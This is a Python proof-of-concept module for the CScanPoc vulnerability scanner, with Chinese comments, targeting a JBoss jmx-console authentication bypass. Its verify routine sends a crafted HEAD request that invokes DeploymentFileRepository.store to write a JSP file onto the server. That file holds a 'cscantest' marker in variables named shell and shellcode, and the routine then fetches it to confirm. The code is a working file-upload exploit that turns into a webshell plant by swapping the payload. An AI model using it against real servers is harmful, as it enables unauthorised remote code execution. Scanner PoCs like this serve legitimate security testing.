# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.error
import urllib.parse
import socket
import time
import random
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'JBoss_0000'  # 平台漏洞编号
    name = 'JBoss 认证绕过'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER  # 漏洞类型
    disclosure_date = '2014-09-12'  # 漏洞公布时间
    desc = '''
        通过Head请求可绕过Jboos的登陆认证，攻击者可通过此漏洞直接获取服务器权限。。
    '''  # 漏洞描述
    ref = 'https://access.redhat.com/solutions/30744'
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'JBoss'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '70809fac-751e-4777-93ab-296546332bc6'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            url = urllib.parse.urlparse(arg)
            host = socket.gethostbyname(url.hostname)
            port = url.port if url.port else 80
            timeout = 10
            s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s1.connect((host, int(port)))
            shell = "cscantest"
            # s1.recv(1024)
            shellcode = ""
            name = ""
            for i in range(5):
                name += (random.choice("ABCDEFGH"))

            for v in shell:
                shellcode += hex(ord(v)).replace("0x", "%")
            flag = "HEAD /jmx-console/HtmlAdaptor?action=invokeOpByName&name=jboss.admin%3Aservice%3DDeploymentFileRepository&methodName=store&argType=" + \
                "java.lang.String&arg0=%s.war&argType=java.lang.String&arg1=cscan&argType=java.lang.String&arg2=.jsp&argType=java.lang.String&arg3=" % (
                   name) + shellcode + \
                "&argType=boolean&arg4=True HTTP/1.0\r\n\r\n"
            s1.send(flag)
            data = s1.recv(512)
            s1.close()
            time.sleep(10)

            webshell_url = arg + '/cscan.jsp'
            res = urllib.request.urlopen(webshell_url, timeout=timeout)
            if 'cscantest' in res.read():
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
